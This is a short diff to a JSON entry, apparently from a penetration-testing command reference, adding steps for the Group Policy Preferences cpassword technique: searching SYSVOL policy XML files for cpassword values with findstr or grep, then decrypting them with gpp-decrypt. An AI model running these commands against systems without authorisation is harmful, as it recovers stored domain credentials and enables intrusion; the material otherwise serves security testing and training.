@@ -83,5 +83,21 @@
   },
   "tools": [
     "gpp-decrypt"
+  ],
+  "variations": [
+    {
+      "label": "Find the cpassword first (Groups.xml)",
+      "command": "findstr /S /I cpassword \\\\<dc>\\SYSVOL\\<domain>\\Policies\\*.xml"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Locate a GPP cpassword in SYSVOL",
+      "command": "grep -r cpassword /mnt/sysvol/  # or findstr on Windows"
+    },
+    {
+      "label": "Decrypt it (AES key is public)",
+      "command": "gpp-decrypt <cpassword>"
+    }
   ]
 }
